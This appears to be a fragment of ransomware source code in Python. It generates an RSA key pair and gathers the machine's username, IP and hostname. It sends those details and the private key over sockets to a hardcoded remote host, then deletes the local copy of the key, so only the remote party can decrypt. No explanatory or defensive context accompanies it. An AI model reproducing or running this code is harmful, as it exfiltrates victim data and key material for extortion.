import socket
import os
import time
import rsa

host = '172.30.202.155'
info_port= 9090
key_port = 6009

# RSA keys
def keygen():
    keys=rsa.newkeys(2048)
    (public_key, private_key) = rsa.newkeys(1024)
    with open('private.pem', 'wb') as f:
        f.write(private_key.save_pkcs1('PEM'))
    with open('public.pem', 'wb') as f:
        f.write(public_key.save_pkcs1('PEM'))


def sending_info():
   key_size=os.path.getsize("private.pem")
   hostname=socket.gethostname()
   ip=socket.gethostbyname(hostname)
   username=os.getlogin()
   key_name=f'{username}_at_{ip}_in_{hostname}_privatekey.pem'
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc_info:
      soc_info.connect((host,info_port))
      soc_info.send(key_name.encode())
      time.sleep(1)
      soc_info.send(str(key_size).encode())


def sending_key():
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc_key:
      soc_key.connect((host,key_port))
      with open('private.pem','rb') as k:
         key=k.read()
      soc_key.sendall(key)
   os.remove('private.pem')




